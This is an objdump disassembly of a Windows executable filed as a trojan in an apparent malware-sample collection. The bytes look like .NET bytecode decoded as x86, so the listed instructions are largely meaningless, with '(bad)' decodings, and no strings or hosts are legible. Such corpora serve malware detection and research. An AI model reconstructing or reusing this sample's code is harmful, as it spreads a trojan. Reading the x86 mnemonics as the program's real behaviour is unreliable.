
malware_samples/trojan/b0a669f605668d5d903f48ce0e59d1183ee36fbff55536f67c8a1b515ba59913.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	b1 db                	mov    $0xdb,%cl
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 98 4c 00    	add    %al,0x4c9800
  402013:	00 30                	add    %dh,(%eax)
  402015:	8e 00                	mov    (%eax),%es
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 2f                	add    %ch,(%edi)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	05 00 3b 03 00       	add    $0x33b00,%eax
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 00                	adc    %eax,(%eax)
  40205d:	73 11                	jae    0x402070
  40205f:	00 00                	add    %al,(%eax)
  402061:	0a 0a                	or     (%edx),%cl
  402063:	73 12                	jae    0x402077
  402065:	00 00                	add    %al,(%eax)
  402067:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40206a:	72 01                	jb     0x40206d
  40206c:	00 00                	add    %al,(%eax)
  40206e:	70 6f                	jo     0x4020df
  402070:	13 00                	adc    (%eax),%eax
  402072:	00 0a                	add    %cl,(%edx)
  402074:	26 08 72 2f          	or     %dh,%es:0x2f(%edx)
  402078:	00 00                	add    %al,(%eax)
  40207a:	70 6f                	jo     0x4020eb
  40207c:	13 00                	adc    (%eax),%eax
  40207e:	00 0a                	add    %cl,(%edx)
  402080:	26 08 72 6b          	or     %dh,%es:0x6b(%edx)
  402084:	00 00                	add    %al,(%eax)
  402086:	70 6f                	jo     0x4020f7
  402088:	13 00                	adc    (%eax),%eax
  40208a:	00 0a                	add    %cl,(%edx)
  40208c:	26 08 72 af          	or     %dh,%es:-0x51(%edx)
  402090:	00 00                	add    %al,(%eax)
  402092:	70 6f                	jo     0x402103
  402094:	13 00                	adc    (%eax),%eax
  402096:	00 0a                	add    %cl,(%edx)
  402098:	26 08 72 90          	or     %dh,%es:-0x70(%edx)
  40209c:	03 00                	add    (%eax),%eax
  40209e:	70 7e                	jo     0x40211e
  4020a0:	09 00                	or     %eax,(%eax)
  4020a2:	00 04 0d 12 03 fe 16 	add    %al,0x16fe0312(,%ecx,1)
  4020a9:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  4020ae:	14 00                	adc    $0x0,%al
  4020b0:	00 0a                	add    %cl,(%edx)
  4020b2:	72 d0                	jb     0x402084
  4020b4:	03 00                	add    (%eax),%eax
  4020b6:	70 28                	jo     0x4020e0
  4020b8:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  4020bd:	13 00                	adc    (%eax),%eax
  4020bf:	00 0a                	add    %cl,(%edx)
  4020c1:	26 08 1d 8d 23 00 00 	or     %bl,%es:0x238d
  4020c8:	01 25 16 72 04 04    	add    %esp,0x4047216
  4020ce:	00 70 a2             	add    %dh,-0x5e(%eax)
  4020d1:	25 17 7f 05 00       	and    $0x57f17,%eax
  4020d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4020d9:	16                   	push   %ss
  4020da:	00 00                	add    %al,(%eax)
  4020dc:	0a a2 25 18 72 43    	or     0x43721825(%edx),%ah
  4020e2:	05 00 70 a2 25       	add    $0x25a27000,%eax
  4020e7:	19 7f 05             	sbb    %edi,0x5(%edi)
  4020ea:	00 00                	add    %al,(%eax)
  4020ec:	04 28                	add    $0x28,%al
  4020ee:	16                   	push   %ss
  4020ef:	00 00                	add    %al,(%eax)
  4020f1:	0a a2 25 1a 72 6b    	or     0x6b721a25(%edx),%ah
  4020f7:	05 00 70 a2 25       	add    $0x25a27000,%eax
  4020fc:	1b 7e 1a             	sbb    0x1a(%esi),%edi
  4020ff:	00 00                	add    %al,(%eax)
  402101:	04 a2                	add    $0xa2,%al
  402103:	25 1c 72 c7 05       	and    $0x5c7721c,%eax
  402108:	00 70 a2             	add    %dh,-0x5e(%eax)
  40210b:	28 17                	sub    %dl,(%edi)
  40210d:	00 00                	add    %al,(%eax)
  40210f:	0a 6f 13             	or     0x13(%edi),%ch
  402112:	00 00                	add    %al,(%eax)
  402114:	0a 26                	or     (%esi),%ah
  402116:	08 72 50             	or     %dh,0x50(%edx)
  402119:	06                   	push   %es
  40211a:	00 70 6f             	add    %dh,0x6f(%eax)
  40211d:	13 00                	adc    (%eax),%eax
  40211f:	00 0a                	add    %cl,(%edx)
  402121:	26 08 72 d3          	or     %dh,%es:-0x2d(%edx)
  402125:	06                   	push   %es
  402126:	00 70 6f             	add    %dh,0x6f(%eax)
  402129:	13 00                	adc    (%eax),%eax
  40212b:	00 0a                	add    %cl,(%edx)
  40212d:	26 08 72 5a          	or     %dh,%es:0x5a(%edx)
  402131:	07                   	pop    %es
  402132:	00 70 6f             	add    %dh,0x6f(%eax)
  402135:	13 00                	adc    (%eax),%eax
  402137:	00 0a                	add    %cl,(%edx)
  402139:	26 08 72 80          	or     %dh,%es:-0x80(%edx)
  40213d:	07                   	pop    %es
  40213e:	00 70 6f             	add    %dh,0x6f(%eax)
  402141:	13 00                	adc    (%eax),%eax
  402143:	00 0a                	add    %cl,(%edx)
  402145:	26 08 72 ca          	or     %dh,%es:-0x36(%edx)
  402149:	07                   	pop    %es
  40214a:	00 70 6f             	add    %dh,0x6f(%eax)
  40214d:	13 00                	adc    (%eax),%eax
  40214f:	00 0a                	add    %cl,(%edx)
  402151:	26 08 72 02          	or     %dh,%es:0x2(%edx)
  402155:	08 00                	or     %al,(%eax)
  402157:	70 6f                	jo     0x4021c8
  402159:	13 00                	adc    (%eax),%eax
  40215b:	00 0a                	add    %cl,(%edx)
  40215d:	26 08 72 48          	or     %dh,%es:0x48(%edx)
  402161:	08 00                	or     %al,(%eax)
  402163:	70 6f                	jo     0x4021d4
  402165:	13 00                	adc    (%eax),%eax
  402167:	00 0a                	add    %cl,(%edx)
  402169:	26 08 72 9a          	or     %dh,%es:-0x66(%edx)
  40216d:	08 00                	or     %al,(%eax)
  40216f:	70 6f                	jo     0x4021e0
  402171:	13 00                	adc    (%eax),%eax
  402173:	00 0a                	add    %cl,(%edx)
  402175:	26 08 72 d4          	or     %dh,%es:-0x2c(%edx)
  402179:	08 00                	or     %al,(%eax)
  40217b:	70 6f                	jo     0x4021ec
  40217d:	13 00                	adc    (%eax),%eax
  40217f:	00 0a                	add    %cl,(%edx)
  402181:	26 08 72 20          	or     %dh,%es:0x20(%edx)
  402185:	09 00                	or     %eax,(%eax)
  402187:	70 6f                	jo     0x4021f8
  402189:	13 00                	adc    (%eax),%eax
  40218b:	00 0a                	add    %cl,(%edx)
  40218d:	26 08 72 54          	or     %dh,%es:0x54(%edx)
  402191:	09 00                	or     %eax,(%eax)
  402193:	70 6f                	jo     0x402204
  402195:	13 00                	adc    (%eax),%eax
  402197:	00 0a                	add    %cl,(%edx)
  402199:	26 08 72 b6          	or     %dh,%es:-0x4a(%edx)
  40219d:	09 00                	or     %eax,(%eax)
  40219f:	70 6f                	jo     0x402210
  4021a1:	13 00                	adc    (%eax),%eax
  4021a3:	00 0a                	add    %cl,(%edx)
  4021a5:	26 08 72 1e          	or     %dh,%es:0x1e(%edx)
  4021a9:	0a 00                	or     (%eax),%al
  4021ab:	70 6f                	jo     0x40221c
  4021ad:	13 00                	adc    (%eax),%eax
  4021af:	00 0a                	add    %cl,(%edx)
  4021b1:	26 08 72 54          	or     %dh,%es:0x54(%edx)
  4021b5:	0a 00                	or     (%eax),%al
  4021b7:	70 6f                	jo     0x402228
  4021b9:	13 00                	adc    (%eax),%eax
  4021bb:	00 0a                	add    %cl,(%edx)
  4021bd:	26 08 1f             	or     %bl,%es:(%edi)
  4021c0:	09 8d 23 00 00 01    	or     %ecx,0x1000023(%ebp)
  4021c6:	25 16 72 6e 0a       	and    $0xa6e7216,%eax
  4021cb:	00 70 a2             	add    %dh,-0x5e(%eax)
  4021ce:	25 17 7e 06 00       	and    $0x67e17,%eax
  4021d3:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4021d6:	25 18 72 98 0a       	and    $0xa987218,%eax
  4021db:	00 70 a2             	add    %dh,-0x5e(%eax)
  4021de:	25 19 7e 01 00       	and    $0x17e19,%eax
  4021e3:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4021e6:	25 1a 72 e0 0a       	and    $0xae0721a,%eax
  4021eb:	00 70 a2             	add    %dh,-0x5e(%eax)
  4021ee:	25 1b 7f 05 00       	and    $0x57f1b,%eax
  4021f3:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021f6:	16                   	push   %ss
  4021f7:	00 00                	add    %al,(%eax)
  4021f9:	0a a2 25 1c 72 f2    	or     -0xd8de3db(%edx),%ah
  4021ff:	0a 00                	or     (%eax),%al
  402201:	70 a2                	jo     0x4021a5
  402203:	25 1d 7e 1a 00       	and    $0x1a7e1d,%eax
  402208:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40220b:	25 1e 72 0c 0b       	and    $0xb0c721e,%eax
  402210:	00 70 a2             	add    %dh,-0x5e(%eax)
  402213:	28 17                	sub    %dl,(%edi)
  402215:	00 00                	add    %al,(%eax)
  402217:	0a 6f 13             	or     0x13(%edi),%ch
  40221a:	00 00                	add    %al,(%eax)
  40221c:	0a 26                	or     (%esi),%ah
  40221e:	08 72 2c             	or     %dh,0x2c(%edx)
  402221:	0b 00                	or     (%eax),%eax
  402223:	70 7e                	jo     0x4022a3
  402225:	07                   	pop    %es
  402226:	00 00                	add    %al,(%eax)
  402228:	04 72                	add    $0x72,%al
  40222a:	86 0b                	xchg   %cl,(%ebx)
  40222c:	00 70 28             	add    %dh,0x28(%eax)
  40222f:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402234:	13 00                	adc    (%eax),%eax
  402236:	00 0a                	add    %cl,(%edx)
  402238:	26 08 72 b6          	or     %dh,%es:-0x4a(%edx)
  40223c:	0b 00                	or     (%eax),%eax
  40223e:	70 6f                	jo     0x4022af
  402240:	13 00                	adc    (%eax),%eax
  402242:	00 0a                	add    %cl,(%edx)
  402244:	26 08 72 d2          	or     %dh,%es:-0x2e(%edx)
  402248:	0b 00                	or     (%eax),%eax
  40224a:	70 6f                	jo     0x4022bb
  40224c:	13 00                	adc    (%eax),%eax
  40224e:	00 0a                	add    %cl,(%edx)
  402250:	26 08 72 ee          	or     %dh,%es:-0x12(%edx)
  402254:	0b 00                	or     (%eax),%eax
  402256:	70 6f                	jo     0x4022c7
  402258:	13 00                	adc    (%eax),%eax
  40225a:	00 0a                	add    %cl,(%edx)
  40225c:	26 08 1b             	or     %bl,%es:(%ebx)
  40225f:	8d 23                	lea    (%ebx),%esp
  402261:	00 00                	add    %al,(%eax)
  402263:	01 25 16 72 63 0d    	add    %esp,0xd637216
  402269:	00 70 a2             	add    %dh,-0x5e(%eax)
  40226c:	25 17 7e 04 00       	and    $0x47e17,%eax
  402271:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402274:	25 18 72 a7 0d       	and    $0xda77218,%eax
  402279:	00 70 a2             	add    %dh,-0x5e(%eax)
  40227c:	25 19 7e 01 00       	and    $0x17e19,%eax
  402281:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402284:	25 1a 72 bf 0d       	and    $0xdbf721a,%eax
  402289:	00 70 a2             	add    %dh,-0x5e(%eax)
  40228c:	28 17                	sub    %dl,(%edi)
  40228e:	00 00                	add    %al,(%eax)
  402290:	0a 6f 13             	or     0x13(%edi),%ch
  402293:	00 00                	add    %al,(%eax)
  402295:	0a 26                	or     (%esi),%ah
  402297:	08 72 e4             	or     %dh,-0x1c(%edx)
  40229a:	0e                   	push   %cs
  40229b:	00 70 6f             	add    %dh,0x6f(%eax)
  40229e:	13 00                	adc    (%eax),%eax
  4022a0:	00 0a                	add    %cl,(%edx)
  4022a2:	26 08 72 67          	or     %dh,%es:0x67(%edx)
  4022a6:	0f 00                	(bad)
  4022a8:	70 6f                	jo     0x402319
  4022aa:	13 00                	adc    (%eax),%eax
  4022ac:	00 0a                	add    %cl,(%edx)
  4022ae:	26 08 72 97          	or     %dh,%es:-0x69(%edx)
  4022b2:	0f 00                	(bad)
  4022b4:	70 6f                	jo     0x402325
  4022b6:	13 00                	adc    (%eax),%eax
  4022b8:	00 0a                	add    %cl,(%edx)
  4022ba:	26 08 72 cf          	or     %dh,%es:-0x31(%edx)
  4022be:	0f 00                	(bad)
  4022c0:	70 6f                	jo     0x402331
  4022c2:	13 00                	adc    (%eax),%eax
  4022c4:	00 0a                	add    %cl,(%edx)
  4022c6:	26 08 72 ef          	or     %dh,%es:-0x11(%edx)
  4022ca:	0f 00                	(bad)
  4022cc:	70 6f                	jo     0x40233d
  4022ce:	13 00                	adc    (%eax),%eax
  4022d0:	00 0a                	add    %cl,(%edx)
  4022d2:	26 08 72 e2          	or     %dh,%es:-0x1e(%edx)
  4022d6:	10 00                	adc    %al,(%eax)
  4022d8:	70 6f                	jo     0x402349
  4022da:	13 00                	adc    (%eax),%eax
  4022dc:	00 0a                	add    %cl,(%edx)
  4022de:	26 02 08             	add    %es:(%eax),%cl
  4022e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4022e2:	14 00                	adc    $0x0,%al
  4022e4:	00 0a                	add    %cl,(%edx)
  4022e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022e7:	18 00                	sbb    %al,(%eax)
  4022e9:	00 0a                	add    %cl,(%edx)
  4022eb:	00 00                	add    %al,(%eax)
  4022ed:	02 6f 19             	add    0x19(%edi),%ch
  4022f0:	00 00                	add    %al,(%eax)
  4022f2:	0a 0b                	or     (%ebx),%cl
  4022f4:	06                   	push   %es
  4022f5:	07                   	pop    %es
  4022f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022f7:	1a 00                	sbb    (%eax),%al
  4022f9:	00 0a                	add    %cl,(%edx)
  4022fb:	00 06                	add    %al,(%esi)
  4022fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4022fe:	1b 00                	sbb    (%eax),%eax
  402300:	00 0a                	add    %cl,(%edx)
  402302:	16                   	push   %ss
  402303:	6f                   	outsl  %ds:(%esi),(%dx)
  402304:	1c 00                	sbb    $0x0,%al
  402306:	00 0a                	add    %cl,(%edx)
  402308:	17                   	pop    %ss
  402309:	6f                   	outsl  %ds:(%esi),(%dx)
  40230a:	1d 00 00 0a a5       	sbb    $0xa50a0000,%eax
  40230f:	29 00                	sub    %eax,(%eax)
  402311:	00 01                	add    %al,(%ecx)
  402313:	80 16 00             	adcb   $0x0,(%esi)
  402316:	00 04 7e             	add    %al,(%esi,%edi,2)
  402319:	16                   	push   %ss
  40231a:	00 00                	add    %al,(%eax)
  40231c:	04 16                	add    $0x16,%al
  40231e:	fe 01                	incb   (%ecx)
  402320:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402323:	04 2c                	add    $0x2c,%al
  402325:	18 00                	sbb    %al,(%eax)
  402327:	72 2a                	jb     0x402353
  402329:	11 00                	adc    %eax,(%eax)
  40232b:	70 28                	jo     0x402355
  40232d:	1e                   	push   %ds
  40232e:	00 00                	add    %al,(%eax)
  402330:	0a 00                	or     (%eax),%al
  402332:	07                   	pop    %es
  402333:	6f                   	outsl  %ds:(%esi),(%dx)
  402334:	1f                   	pop    %ds
  402335:	00 00                	add    %al,(%eax)
  402337:	0a 00                	or     (%eax),%al
  402339:	16                   	push   %ss
  40233a:	13 05 de 56 72 58    	adc    0x587256de,%eax
  402340:	11 00                	adc    %eax,(%eax)
  402342:	70 28                	jo     0x40236c
  402344:	1e                   	push   %ds
  402345:	00 00                	add    %al,(%eax)
  402347:	0a 00                	or     (%eax),%al
  402349:	72 72                	jb     0x4023bd
  40234b:	11 00                	adc    %eax,(%eax)
  40234d:	70 7e                	jo     0x4023cd
  40234f:	16                   	push   %ss
  402350:	00 00                	add    %al,(%eax)
  402352:	04 8c                	add    $0x8c,%al
  402354:	29 00                	sub    %eax,(%eax)
  402356:	00 01                	add    %al,(%ecx)
  402358:	28 20                	sub    %ah,(%eax)
  40235a:	00 00                	add    %al,(%eax)
  40235c:	0a 00                	or     (%eax),%al
  40235e:	07                   	pop    %es
  40235f:	6f                   	outsl  %ds:(%esi),(%dx)
  402360:	1f                   	pop    %ds
  402361:	00 00                	add    %al,(%eax)
  402363:	0a 00                	or     (%eax),%al
  402365:	17                   	pop    %ss
  402366:	13 05 de 2a 13 06    	adc    0x6132ade,%eax
  40236c:	00 72 a2             	add    %dh,-0x5e(%edx)
  40236f:	11 00                	adc    %eax,(%eax)
  402371:	70 28                	jo     0x40239b
  402373:	1e                   	push   %ds
  402374:	00 00                	add    %al,(%eax)
  402376:	0a 00                	or     (%eax),%al
  402378:	72 e8                	jb     0x402362
  40237a:	11 00                	adc    %eax,(%eax)
  40237c:	70 11                	jo     0x40238f
  40237e:	06                   	push   %es
  40237f:	6f                   	outsl  %ds:(%esi),(%dx)
  402380:	21 00                	and    %eax,(%eax)
  402382:	00 0a                	add    %cl,(%edx)
  402384:	28 22                	sub    %ah,(%edx)
  402386:	00 00                	add    %al,(%eax)
  402388:	0a 28                	or     (%eax),%ch
  40238a:	1e                   	push   %ds
  40238b:	00 00                	add    %al,(%eax)
  40238d:	0a 00                	or     (%eax),%al
  40238f:	16                   	push   %ss
  402390:	13 05 de 00 11 05    	adc    0x51100de,%eax
  402396:	2a 00                	sub    (%eax),%al
  402398:	01 10                	add    %edx,(%eax)
  40239a:	00 00                	add    %al,(%eax)
  40239c:	00 00                	add    %al,(%eax)
  40239e:	90                   	nop
  40239f:	02 7e 0e             	add    0xe(%esi),%bh
  4023a2:	03 2a                	add    (%edx),%ebp
  4023a4:	16                   	push   %ss
  4023a5:	00 00                	add    %al,(%eax)
  4023a7:	01 1b                	add    %ebx,(%ebx)
  4023a9:	30 05 00 c0 01 00    	xor    %al,0x1c000
  4023af:	00 02                	add    %al,(%edx)
  4023b1:	00 00                	add    %al,(%eax)
  4023b3:	11 00                	adc    %eax,(%eax)
  4023b5:	73 12                	jae    0x4023c9
  4023b7:	00 00                	add    %al,(%eax)
  4023b9:	0a 0b                	or     (%ebx),%cl
  4023bb:	07                   	pop    %es
  4023bc:	1b 8d 23 00 00 01    	sbb    0x1000023(%ebp),%ecx
  4023c2:	25 16 72 08 12       	and    $0x12087216,%eax
  4023c7:	00 70 a2             	add    %dh,-0x5e(%eax)
  4023ca:	25 17 7e 09 00       	and    $0x97e17,%eax
  4023cf:	00 04 0c             	add    %al,(%esp,%ecx,1)
  4023d2:	12 02                	adc    (%edx),%al
  4023d4:	fe                   	(bad)
  4023d5:	16                   	push   %ss
  4023d6:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  4023db:	14 00                	adc    $0x0,%al
  4023dd:	00 0a                	add    %cl,(%edx)
  4023df:	a2 25 18 72 3a       	mov    %al,0x3a721825
  4023e4:	12 00                	adc    (%eax),%al
  4023e6:	70 a2                	jo     0x40238a
  4023e8:	25 19 7e 09 00       	and    $0x97e19,%eax
  4023ed:	00 04 0c             	add    %al,(%esp,%ecx,1)
  4023f0:	12 02                	adc    (%edx),%al
  4023f2:	fe                   	(bad)
  4023f3:	16                   	push   %ss
  4023f4:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  4023f9:	14 00                	adc    $0x0,%al
  4023fb:	00 0a                	add    %cl,(%edx)
  4023fd:	a2 25 1a 72 8a       	mov    %al,0x8a721a25
  402402:	12 00                	adc    (%eax),%al
  402404:	70 a2                	jo     0x4023a8
  402406:	28 17                	sub    %dl,(%edi)
  402408:	00 00                	add    %al,(%eax)
  40240a:	0a 6f 13             	or     0x13(%edi),%ch
  40240d:	00 00                	add    %al,(%eax)
  40240f:	0a 26                	or     (%esi),%ah
  402411:	07                   	pop    %es
  402412:	72 08                	jb     0x40241c
  402414:	12 00                	adc    (%eax),%al
  402416:	70 7e                	jo     0x402496
  402418:	09 00                	or     %eax,(%eax)
  40241a:	00 04 0c             	add    %al,(%esp,%ecx,1)
  40241d:	12 02                	adc    (%edx),%al
  40241f:	fe                   	(bad)
  402420:	16                   	push   %ss
  402421:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  402426:	14 00                	adc    $0x0,%al
  402428:	00 0a                	add    %cl,(%edx)
  40242a:	72 c3                	jb     0x4023ef
  40242c:	14 00                	adc    $0x0,%al
  40242e:	70 28                	jo     0x402458
  402430:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402435:	13 00                	adc    (%eax),%eax
  402437:	00 0a                	add    %cl,(%edx)
  402439:	26 07                	es pop %es
  40243b:	1f                   	pop    %ds
  40243c:	15 8d 23 00 00       	adc    $0x238d,%eax
  402441:	01 25 16 72 08 12    	add    %esp,0x12087216
  402447:	00 70 a2             	add    %dh,-0x5e(%eax)
  40244a:	25 17 7e 09 00       	and    $0x97e17,%eax
  40244f:	00 04 0c             	add    %al,(%esp,%ecx,1)
  402452:	12 02                	adc    (%edx),%al
  402454:	fe                   	(bad)
  402455:	16                   	push   %ss
  402456:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  40245b:	14 00                	adc    $0x0,%al
  40245d:	00 0a                	add    %cl,(%edx)
  40245f:	a2 25 18 72 f6       	mov    %al,0xf6721825
  402464:	15 00 70 a2 25       	adc    $0x25a27000,%eax
  402469:	19 7f 05             	sbb    %edi,0x5(%edi)
  40246c:	00 00                	add    %al,(%eax)
  40246e:	04 28                	add    $0x28,%al
  402470:	16                   	push   %ss
  402471:	00 00                	add    %al,(%eax)
  402473:	0a a2 25 1a 72 43    	or     0x43721a25(%edx),%ah
  402479:	05 00 70 a2 25       	add    $0x25a27000,%eax
  40247e:	1b 7f 05             	sbb    0x5(%edi),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 28                	add    $0x28,%al
  402485:	16                   	push   %ss
  402486:	00 00                	add    %al,(%eax)
  402488:	0a a2 25 1c 72 51    	or     0x51721c25(%edx),%ah
  40248e:	17                   	pop    %ss
  40248f:	00 70 a2             	add    %dh,-0x5e(%eax)
  402492:	25 1d 7e 06 00       	and    $0x67e1d,%eax
  402497:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40249a:	25 1e 72 98 0a       	and    $0xa98721e,%eax
  40249f:	00 70 a2             	add    %dh,-0x5e(%eax)
  4024a2:	25 1f 09 7e 01       	and    $0x17e091f,%eax
  4024a7:	00 00                	add    %al,(%eax)
  4024a9:	04 a2                	add    $0xa2,%al
  4024ab:	25 1f 0a 72 e0       	and    $0xe0720a1f,%eax
  4024b0:	0a 00                	or     (%eax),%al
  4024b2:	70 a2                	jo     0x402456
  4024b4:	25 1f 0b 7f 05       	and    $0x57f0b1f,%eax
  4024b9:	00 00                	add    %al,(%eax)
  4024bb:	04 28                	add    $0x28,%al
  4024bd:	16                   	push   %ss
  4024be:	00 00                	add    %al,(%eax)
  4024c0:	0a a2 25 1f 0c 72    	or     0x720c1f25(%edx),%ah
  4024c6:	f2 0a 00             	repnz or (%eax),%al
  4024c9:	70 a2                	jo     0x40246d
  4024cb:	25 1f 0d 7e 1a       	and    $0x1a7e0d1f,%eax
  4024d0:	00 00                	add    %al,(%eax)
  4024d2:	04 a2                	add    $0xa2,%al
  4024d4:	25 1f 0e 72 48       	and    $0x48720e1f,%eax
  4024d9:	18 00                	sbb    %al,(%eax)
  4024db:	70 a2                	jo     0x40247f
  4024dd:	25 1f 0f 7e 07       	and    $0x77e0f1f,%eax
  4024e2:	00 00                	add    %al,(%eax)
  4024e4:	04 a2                	add    $0xa2,%al
  4024e6:	25 1f 10 72 c4       	and    $0xc472101f,%eax
  4024eb:	18 00                	sbb    %al,(%eax)
  4024ed:	70 a2                	jo     0x402491
  4024ef:	25 1f 11 7e 04       	and    $0x47e111f,%eax
  4024f4:	00 00                	add    %al,(%eax)
  4024f6:	04 a2                	add    $0xa2,%al
  4024f8:	25 1f 12 72 a7       	and    $0xa772121f,%eax
  4024fd:	0d 00 70 a2 25       	or     $0x25a27000,%eax
  402502:	1f                   	pop    %ds
  402503:	13 7e 01             	adc    0x1(%esi),%edi
  402506:	00 00                	add    %al,(%eax)
  402508:	04 a2                	add    $0xa2,%al
  40250a:	25 1f 14 72 e7       	and    $0xe772141f,%eax
  40250f:	19 00                	sbb    %eax,(%eax)
  402511:	70 a2                	jo     0x4024b5
  402513:	28 17                	sub    %dl,(%edi)
  402515:	00 00                	add    %al,(%eax)
  402517:	0a 6f 13             	or     0x13(%edi),%ch
  40251a:	00 00                	add    %al,(%eax)
  40251c:	0a 26                	or     (%esi),%ah
  40251e:	02 07                	add    (%edi),%al
  402520:	6f                   	outsl  %ds:(%esi),(%dx)
  402521:	14 00                	adc    $0x0,%al
  402523:	00 0a                	add    %cl,(%edx)
  402525:	6f                   	outsl  %ds:(%esi),(%dx)
  402526:	18 00                	sbb    %al,(%eax)
  402528:	00 0a                	add    %cl,(%edx)
  40252a:	00 00                	add    %al,(%eax)
  40252c:	72 4a                	jb     0x402578
  40252e:	1b 00                	sbb    (%eax),%eax
  402530:	70 28                	jo     0x40255a
  402532:	1e                   	push   %ds
  402533:	00 00                	add    %al,(%eax)
  402535:	0a 00                	or     (%eax),%al
  402537:	02 6f 19             	add    0x19(%edi),%ch
  40253a:	00 00                	add    %al,(%eax)
  40253c:	0a 0a                	or     (%edx),%cl
  40253e:	06                   	push   %es
  40253f:	6f                   	outsl  %ds:(%esi),(%dx)
  402540:	1f                   	pop    %ds
  402541:	00 00                	add    %al,(%eax)
  402543:	0a 00                	or     (%eax),%al
  402545:	17                   	pop    %ss
  402546:	0d de 29 13 04       	or     $0x41329de,%eax
  40254b:	00 72 70             	add    %dh,0x70(%edx)
  40254e:	1b 00                	sbb    (%eax),%eax
  402550:	70 28                	jo     0x40257a
  402552:	1e                   	push   %ds
  402553:	00 00                	add    %al,(%eax)
  402555:	0a 00                	or     (%eax),%al
  402557:	72 e8                	jb     0x402541
  402559:	11 00                	adc    %eax,(%eax)
  40255b:	70 11                	jo     0x40256e
  40255d:	04 6f                	add    $0x6f,%al
  40255f:	21 00                	and    %eax,(%eax)
  402561:	00 0a                	add    %cl,(%edx)
  402563:	28 22                	sub    %ah,(%edx)
  402565:	00 00                	add    %al,(%eax)
  402567:	0a 28                	or     (%eax),%ch
  402569:	1e                   	push   %ds
  40256a:	00 00                	add    %al,(%eax)
  40256c:	0a 00                	or     (%eax),%al
  40256e:	16                   	push   %ss
  40256f:	0d de 00 09 2a       	or     $0x2a0900de,%eax
  402574:	01 10                	add    %edx,(%eax)
  402576:	00 00                	add    %al,(%eax)
  402578:	00 00                	add    %al,(%eax)
  40257a:	77 01                	ja     0x40257d
  40257c:	1e                   	push   %ds
  40257d:	95                   	xchg   %eax,%ebp
  40257e:	01 29                	add    %ebp,(%ecx)
  402580:	16                   	push   %ss
  402581:	00 00                	add    %al,(%eax)
  402583:	01 1b                	add    %ebx,(%ebx)
  402585:	30 05 00 c7 01 00    	xor    %al,0x1c700
  40258b:	00 02                	add    %al,(%edx)
  40258d:	00 00                	add    %al,(%eax)
  40258f:	11 00                	adc    %eax,(%eax)
  402591:	73 12                	jae    0x4025a5
  402593:	00 00                	add    %al,(%eax)
  402595:	0a 0b                	or     (%ebx),%cl
  402597:	07                   	pop    %es
  402598:	1d 8d 23 00 00       	sbb    $0x238d,%eax
  40259d:	01 25 16 72 08 12    	add    %esp,0x12087216
  4025a3:	00 70 a2             	add    %dh,-0x5e(%eax)
  4025a6:	25 17 7e 0a 00       	and    $0xa7e17,%eax
  4025ab:	00 04 0c             	add    %al,(%esp,%ecx,1)
  4025ae:	12 02                	adc    (%edx),%al
  4025b0:	fe                   	(bad)
  4025b1:	16                   	push   %ss
  4025b2:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  4025b7:	14 00                	adc    $0x0,%al
  4025b9:	00 0a                	add    %cl,(%edx)
  4025bb:	a2 25 18 72 c2       	mov    %al,0xc2721825
  4025c0:	1b 00                	sbb    (%eax),%eax
  4025c2:	70 a2                	jo     0x402566
  4025c4:	25 19 7e 0a 00       	and    $0xa7e19,%eax
  4025c9:	00 04 0c             	add    %al,(%esp,%ecx,1)
  4025cc:	12 02                	adc    (%edx),%al
  4025ce:	fe                   	(bad)
  4025cf:	16                   	push   %ss
  4025d0:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  4025d5:	14 00                	adc    $0x0,%al
  4025d7:	00 0a                	add    %cl,(%edx)
  4025d9:	a2 25 1a 72 12       	mov    %al,0x12721a25
  4025de:	1c 00                	sbb    $0x0,%al
  4025e0:	70 a2                	jo     0x402584
  4025e2:	25 1b 7e 09 00       	and    $0x97e1b,%eax
  4025e7:	00 04 0c             	add    %al,(%esp,%ecx,1)
  4025ea:	12 02                	adc    (%edx),%al
  4025ec:	fe                   	(bad)
  4025ed:	16                   	push   %ss
  4025ee:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  4025f3:	14 00                	adc    $0x0,%al
  4025f5:	00 0a                	add    %cl,(%edx)
  4025f7:	a2 25 1c 72 f5       	mov    %al,0xf5721c25
  4025fc:	1e                   	push   %ds
  4025fd:	00 70 a2             	add    %dh,-0x5e(%eax)
  402600:	28 17                	sub    %dl,(%edi)
  402602:	00 00                	add    %al,(%eax)
  402604:	0a 6f 13             	or     0x13(%edi),%ch
  402607:	00 00                	add    %al,(%eax)
  402609:	0a 26                	or     (%esi),%ah
  40260b:	07                   	pop    %es
  40260c:	1f                   	pop    %ds
  40260d:	0b 8d 23 00 00 01    	or     0x1000023(%ebp),%ecx
